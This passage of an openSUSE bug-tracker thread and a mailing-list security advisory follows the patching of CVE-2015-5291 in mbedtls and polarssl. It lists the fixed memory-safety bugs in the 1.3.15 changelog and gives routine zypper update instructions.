workaround below. ``` [Comment 1](show_bug.cgi?id=949380#c1)  Bernhard Wiedemann   2015-10-08 07:00:12 UTC  ``` This is an autogenerated message for OBS integration: This bug (949380) was mentioned in <https://build.opensuse.org/request/show/337106> Factory / mbedtls ``` [Comment 2](show_bug.cgi?id=949380#c2)  Martin Pluskal   2015-10-08 07:35:06 UTC  ``` Version containing fix sent to factory, 13.2 needs fix also. ``` [Comment 3](show_bug.cgi?id=949380#c3)  Swamp Workflow Management   2015-10-08 22:00:16 UTC  ``` bugbot adjusting priority ``` [Comment 4](show_bug.cgi?id=949380#c4)  Johannes Segitz   2015-11-10 12:22:25 UTC  ``` (In reply to Martin Pluskal from [comment #2](show_bug.cgi?id=949380#c2)) I don't see it on 13.2, but Leap needs the fix. ``` [Comment 5](show_bug.cgi?id=949380#c5)  Andreas Stieger   2015-12-13 08:52:22 UTC  ``` releasing for Leap 42.1 ``` [Comment 6](show_bug.cgi?id=949380#c6)  Swamp Workflow Management   2015-12-13 12:12:54 UTC  ``` openSUSE-SU-2015:2257-1: An update that fixes one vulnerability is now available.  Category: security (important) Bug References: 949380 CVE References: CVE-2015-5291 Sources used: openSUSE Leap 42.1 (src):    mbedtls-1.3.15-6.1 ``` [Comment 7](show_bug.cgi?id=949380#c7)  Andreas Stieger   2015-12-13 19:25:27 UTC  ``` Markus noted that this package is still affected: openSUSE:13.2:Update/polarssl ``` [Comment 8](show_bug.cgi?id=949380#c8)  Andreas Stieger   2015-12-13 19:33:31 UTC  ``` Created [attachment 659108](attachment.cgi?id=659108&action=diff "proposed backport") [[details]](attachment.cgi?id=659108&action=edit "proposed backport") proposed backport  Based on the advisory, the following includes the fix for polarssl:  <https://github.com/ARMmbed/mbedtls/compare/21823f9a69d22f4cc5eb17493a1b6dbd889a24c8...643a922c56b77235e88f106fb1b41c1a764cea5f>  This backport is adjusted for context changes and discards two hunks in functions that were added after 1.3.9. Maintainer, please check this minimum fix?   But there are more security relevant changes merged into the 1.3.14 tag, mostly memory handling stuff:  <https://github.com/ARMmbed/mbedtls/compare/21823f9a69d22f4cc5eb17493a1b6dbd889a24c8...36abef4c5c0a9466085719ec1a102198374fa657> ``` [Comment 9](show_bug.cgi?id=949380#c9)  Andreas Stieger   2015-12-19 09:10:23 UTC  ``` Received <https://build.opensuse.org/request/show/349628> ``` [Comment 10](show_bug.cgi?id=949380#c10)  Andreas Stieger   2015-12-26 20:51:12 UTC  ``` Releasing 13.2 update ``` [Comment 11](show_bug.cgi?id=949380#c11)  Swamp Workflow Management   2015-12-27 00:12:42 UTC  ``` openSUSE-SU-2015:2371-1: An update that fixes one vulnerability is now available.  Category: security (moderate) Bug References: 949380 CVE References: CVE-2015-5291 Sources used: openSUSE 13.2 (src):    polarssl-1.3.9-11.1 ``` |  |
| --- | --- |

---

* [Format For Printing](show_bug.cgi?format=multiple&id=949380)
* - [XML](show_bug.cgi?ctype=xml&id=949380)
* - [Clone This Bug](enter_bug.cgi?cloned_bug_id=949380)
* - Top of page

* + [Home](./)
  + | [New](enter_bug.cgi)
  + | [Browse](describecomponents.cgi)
  + | [Search](query.cgi)
  + |

    [[?]](page.cgi?id=quicksearch.html "Quicksearch Help")
  + | [Reports](report.cgi)
  + |
    [Requests](request.cgi)
  + |
    [IDP Log In](/saml2_login.cgi?idp=IDP&target=show_bug.cgi%3Fid%3D949380)
  + |
    [Forgot Password](https://idp-portal.suse.com/univention/self-service/#page=passwordreset)

+ Legal:
+ [openSUSE](http://en.opensuse.org/Terms_of_site)
+ [SUSE](https://www.suse.com/company/legal/)



=== Content from lists.opensuse.org_a165b902_20250125_143417.html ===


[![openSUSE](https://static.opensuse.org/favicon.svg)
Mailing Lists](/archives/ "openSUSE Mailing Lists")

[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/)

[Manage this list](/manage/lists/security-announce.lists.opensuse.org/)
[Sign In](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/)
[Sign Up](/accounts/signup/?next=/archives/list/security-announce%40lists.opensuse.org/message/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/)

×
#### Keyboard Shortcuts

### Thread View

* `j`: Next unread message
* `k`: Previous unread message
* `j a`: Jump to all threads* `j l`: Jump to MailingList overview

[thread](/archives/list/security-announce%40lists.opensuse.org/thread/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/#E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH)

# [security-announce] openSUSE-SU-2015:2257-1: important: Security update for mbedtls

![](https://seccdn.libravatar.org/avatar/099a17325bdf082b643d1a6bbacde279.jpg?s=120&d=mm&r=g)
## [opensuse-security＠opensuse.org](/archives/users/1b72def497ef4503896cd7a5fe9fb8e0/ "See the profile for opensuse-security＠opensuse.org")

13 Dec
2015

13 Dec
'15

12:12

openSUSE Security Update: Security update for mbedtls
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
Announcement ID: openSUSE-SU-2015:2257-1
Rating: important
References: #949380
Cross-References: CVE-2015-5291
Affected Products:
openSUSE Leap 42.1
\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_\_
An update that fixes one vulnerability is now available.
Description:
This update for mbedtls fixes the following security and non-security
issues:
- Update to 1.3.15
\* Fix potential double free if ssl\_set\_psk() is called more than once
and some allocation fails. Cannot be forced remotely. Found by Guido
Vranken, Intelworks.
\* Fix potential heap corruption on windows when x509\_crt\_parse\_path() is
passed a path longer than 2GB. Cannot be triggered remotely. Found by
Guido Vranken, Intelworks.
\* Fix potential buffer overflow in some asn1\_write\_xxx() functions.
Cannot be triggered remotely unless you create X.509 certificates based
on untrusted input or write keys of untrusted origin. Found by Guido
Vranken, Intelworks.
\* The x509 max\_pathlen constraint was not enforced on intermediate
certificates. Found by Nicholas Wilson, fix and tests provided by
Janos Follath. #280 and #319
\* Self-signed certificates were not excluded from pathlen counting,
resulting in some valid X.509 being incorrectly rejected. Found and
fix provided by Janos Follath. #319
\* Fix bug causing some handshakes to fail due to some non-fatal alerts
not begin properly ignored. Found by mancha and Kasom Koht-arsa, #308
\* Fix build error with configurations where ecdhe-psk is the only key
exchange. Found and fix provided by Chris Hammond. #270
\* Fix failures in mpi on sparc(64) due to use of bad assembly code.
Found by Kurt Danielson. #292
\* Fix typo in name of the extkeyusage oid. found by inestlerode, #314
\* Fix bug in asn.1 encoding of booleans that caused generated ca
certificates to be rejected by some applications, including OS X
Keychain. Found and fixed by Jonathan Leroy, Inikup.
\* Fix "destination buffer is too small" error in cert\_write program.
Found and fixed by Jonathan Leroy, Inikup.
- Update to 1.3.14
\* Added fix for CVE-2015-5291 (boo#949380) to prevent heap corruption
due to buffer
overflow of the hostname or session ticket. Found by Guido Vranken,
Intelworks.
\* Fix stack buffer overflow in pkcs12 decryption (used by
mbedtls\_pk\_parse\_key(file)() when the password is > 129 bytes. Found
by Guido Vranken, Intelworks. Not triggerable remotely.
\* Fix potential buffer overflow in mbedtls\_mpi\_read\_string(). Found by
Guido Vranken, Intelworks. Not exploitable remotely in the context
of TLS, but might be in other uses. On 32 bit machines, requires
reading a string of close to or larger than 1GB to exploit; on 64 bit
machines, would require reading a string of close to or larger than
2^62 bytes.
\* Fix potential random memory allocation in mbedtls\_pem\_read\_buffer()
on crafted PEM input data. Found and fix provided by Guido Vranken,
Intelworks. Not triggerable remotely in TLS. Triggerable remotely if
you accept PEM data from an untrusted source.
\* Fix potential double-free if ssl\_set\_psk() is called repeatedly on the
same ssl\_context object and some memory allocations fail. Found by
Guido Vranken, Intelworks. Can not be forced remotely.
\* Fix possible heap buffer overflow in base64\_encode() when the input
buffer is 512MB or larger on 32-bit platforms. Found by Guido Vranken,
Intelworks. Found by Guido Vranken. Not trigerrable remotely in TLS.
\* Fix potential heap buffer overflow in servers that perform client
authentication against a crafted CA cert. Cannot be triggered remotely
unless you allow third parties to pick trust CAs for client auth.
Found by Guido Vranken, Intelworks.
\* Fix compile error in net.c with musl libc. found and patch provided by
zhasha (#278).
\* Fix macroization of 'inline' keywork when building as c++. (#279)
\* Added checking of hostname length in ssl\_set\_hostname() to ensure
domain names are compliant with RFC 1035.
- Changes for 1.3.13
\* Fix possible client-side null pointer dereference (read) when the
client tries to continue the handshake after it failed (a misuse of
the API). (Found and patch provided by Fabian Foerg, Gotham Digital
Science using afl-fuzz.)
\* Add countermeasure against lenstra's rsa-crt attack for pkcs#1 v1.5
signatures. (Found by Florian Weimer, Red Hat.)
<https://securityblog.redhat.com/2015/09/02/factoring-rsa-keys-with-tls-perf>
ect-forward-secrecy/
\* Setting ssl\_min\_dhm\_bytes in config.h had no effect (overriden in
ssl.h) (found by Fabio Solari) (#256)
\* Fix bug in mbedtls\_rsa\_public() and mbedtls\_rsa\_private() that could
result trying to unlock an unlocked mutex on invalid input (found by
Fredrik Axelsson) (#257)
\* Fix -wshadow warnings (found by hnrkp) (#240)
\* Fix unused function warning when using mbedtls\_mdx\_alt or
MBEDTLS\_SHAxxx\_ALT (found by Henrik) (#239)
\* Fix memory corruption in pkey programs (found by yankuncheng) (#210)
\* Fix memory corruption on client with overlong psk identity, around
SSL\_MAX\_CONTENT\_LEN or higher - not triggerrable remotely (found by
Aleksandrs Saveljevs) (#238)
\* Fix off-by-one error in parsing supported point format extension that
caused some handshakes to fail.
\* When verifying a certificate chain, if an intermediate certificate is
trusted, no later cert is checked. (suggested by hannes-landeholm)
(#220).
- Changes for 1.3.12
\* Increase the minimum size of diffie-hellman parameters accepted by the
client to 1024 bits, to protect against Logjam attack.
\* Increase the size of default diffie-hellman parameters on the server
to 2048 bits. This can be changed with ssl\_set\_dh\_params().
\* Fix thread-safety issue in ssl debug module (found by edwin van vliet).
\* Some example programs were not built using make, not included in
visual Studio projects (found by Kristian Bendiksen).
\* Fix build error with cmake and pre-4.5 versions of gcc (found by hugo
Leisink).
\* Fix missing -static-ligcc when building shared libraries for windows
with make.
\* Fix compile error with armcc5 --gnu.
\* Add ssl\_min\_dhm\_bytes configuration parameter in config.h to choose
the minimum size of Diffie-Hellman parameters accepted by the client.
\* The pem parser now accepts a trailing space at end of lines (#226).
Patch Instructions:
To install this openSUSE Security Update use YaST online\_update.
Alternatively you can run the command listed for your product:
- openSUSE Leap 42.1:
zypper in -t patch openSUSE-2015-898=1
To bring your system up-to-date, use "zypper patch".
Package List:
- openSUSE Leap 42.1 (i586 x86\_64):
libmbedtls9-1.3.15-6.1
libmbedtls9-debuginfo-1.3.15-6.1
mbedtls-debugsource-1.3.15-6.1
mbedtls-devel-1.3.15-6.1
- openSUSE Leap 42.1 (x86\_64):
libmbedtls9-32bit-1.3.15-6.1
libmbedtls9-debuginfo-32bit-1.3.15-6.1
References:
<https://www.suse.com/security/cve/CVE-2015-5291.html>
<https://bugzilla.suse.com/949380>
--
To unsubscribe, e-mail: opensuse-security-announce+unsubscribe@opensuse.org
For additional commands, e-mail: opensuse-security-announce+help@opensuse.org

[0](#like "You must be logged-in to vote.")
[0](#dislike "You must be logged-in to vote.")

Reply

[Sign in to reply online](/accounts/login/?next=/archives/list/security-announce%40lists.opensuse.org/message/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/)
Use email software

[Back to the thread](/archives/list/security-announce%40lists.opensuse.org/thread/E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH/#E5TLNZZQUO45PVXGT6S2YSICBQSLYZRH)

[Back to the list](/archives/list/security-announce%40lists.opensuse.org/)

![HyperKitty](/static/hyperkitty/img/logo.png)
Powered by [HyperKitty](http://hyperkitty.readthedocs.org) version 1.3.12.


